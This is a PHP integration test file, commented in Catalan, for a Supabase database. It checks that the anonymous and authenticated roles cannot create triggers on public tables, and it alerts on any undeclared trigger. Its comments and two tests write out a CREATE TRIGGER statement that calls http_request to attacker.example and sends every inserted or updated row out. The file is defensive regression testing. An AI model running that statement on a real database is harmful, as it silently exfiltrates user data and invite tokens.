<?php

declare(strict_types=1);

use Doctrine\DBAL\Exception\DriverException;
use Tests\Integration\Kal\Infrastructure\Persistence\SupabaseConnection;
use Tests\Integration\Rls\RlsFixture;

// El control que faltava, i el més valuós dels tres fitxers d'aquesta sèrie.
//
// `anon` i `authenticated` van heretar `TRIGGER` sobre les vuit taules de
// `public` del mateix `ALTER DEFAULT PRIVILEGES` que els va donar el `TRUNCATE`.
// I `create trigger` NO demana `CREATE` sobre l'esquema — només `TRIGGER` sobre
// la taula i `EXECUTE` sobre la funció —, o sigui que «no tenen CREATE enlloc»
// no els aturava. La funció ja la posa Supabase:
// `supabase_functions.http_request()` retorna `trigger`, és `SECURITY DEFINER` i
// té `EXECUTE` concedit explícitament als dos rols.
//
// Amb això, un `after insert or update on kals ... execute function
// http_request('https://attacker.example/collect', ...)` fa que CADA escriptura
// del backend enviï la fila sencera a fora, amb l'`invite_token` en text pla.
// Pitjor que el `TRUNCATE`: allò era destrucció sorollosa i recuperable, això és
// exfiltració contínua i silenciosa que no altera cap dada ni fa fallar cap
// consulta. Es posa un cop i no ho mira mai ningú.
//
// Per això el primer test d'aquest fitxer no prova cap permís: prova que no hi
// HA cap trigger. El grant es pot tornar a concedir sol —
// l'`ALTER DEFAULT PRIVILEGES` segueix viu i tota taula nova naixerà amb `Dxt`
// (veure `20260830154434_revoke_inherited_trigger_grants.sql`) —, i llavors
// l'única cosa que separaria la porta del darrere de ningú és aquesta consulta.

/**
 * Triggers legítims, com a `taula.trigger`. Avui cap: l'únic trigger del
 * projecte és `handle_new_user()`, que penja d'`auth.users` i no de `public`.
 *
 * SI AFEGEIXES UN TRIGGER DE VERITAT, apunta'l aquí i el test torna a verd. És
 * a posta que calgui tocar aquesta llista: el que no ha de poder passar és que
 * n'aparegui un i no se n'assabenti ningú.
 *
 * @var list<string>
 */
const EXPECTED_TRIGGERS = [];

beforeEach(function (): void {
    SupabaseConnection::begin();

    $this->connection = SupabaseConnection::get();
});

afterEach(function (): void {
    SupabaseConnection::rollBack();
});

// S'exclouen els `tgisinternal`: són els triggers que Postgres es fabrica sol
// per fer complir les FKs i els constraints, n'hi ha desenes i no els escriu
// ningú. Si no s'exclouen, el test és soroll pur i acaba desactivat.
it('has no unexpected triggers on the public tables', function (): void {
    $found = $this->connection->fetchFirstColumn(
        <<<'SQL'
            SELECT c.relname || '.' || t.tgname
            FROM pg_trigger t
            JOIN pg_class c ON c.oid = t.tgrelid
            JOIN pg_namespace n ON n.oid = c.relnamespace
            WHERE n.nspname = 'public'
              AND c.relname = ANY(:tables)
              AND NOT t.tgisinternal
            ORDER BY 1
            SQL,
        ['tables' => '{'.implode(',', RlsFixture::PUBLIC_TABLES).'}'],
    );

    $unexpected = array_values(array_diff($found, EXPECTED_TRIGGERS));

    // Es compara la llista JA formatada en comptes de dos arrays: així el text
    // que imprimeix Pest en fallar diu el nom exacte del trigger que ha
    // aparegut, en comptes d'un diff d'arrays que obliga a anar a buscar-lo.
    expect(implode(', ', $unexpected))->toBe(
        '',
        'Ha aparegut un trigger no declarat sobre les taules de `public`. Si és legítim, afegeix-lo a EXPECTED_TRIGGERS; si no saps d\'on surt, tracta\'l com una porta del darrere (veure el capçal d\'aquest fitxer).',
    );
});

// Els dos rols per separat: els seus grants ja han divergit dues vegades en
// aquesta mateixa sèrie de migracions, i provar-ne només un és exactament el
// que va deixar `anon` amb el TRUNCATE un dia de més.
it('does not let an authenticated caller create a trigger on kals', function (): void {
    SupabaseConnection::asAuthenticatedRole();

    expect(fn () => $this->connection->executeStatement(
        "CREATE TRIGGER zz_exfiltrate AFTER INSERT OR UPDATE ON kals FOR EACH ROW EXECUTE FUNCTION supabase_functions.http_request('https://attacker.example/collect', 'POST', '{}', '{}', '1000')",
    ))->toThrow(DriverException::class, 'permission denied for table kals');
});

it('does not let an anonymous caller create a trigger on kals', function (): void {
    SupabaseConnection::asAnonRole();

    expect(fn () => $this->connection->executeStatement(
        "CREATE TRIGGER zz_exfiltrate AFTER INSERT OR UPDATE ON kals FOR EACH ROW EXECUTE FUNCTION supabase_functions.http_request('https://attacker.example/collect', 'POST', '{}', '{}', '1000')",
    ))->toThrow(DriverException::class, 'permission denied for table kals');
});
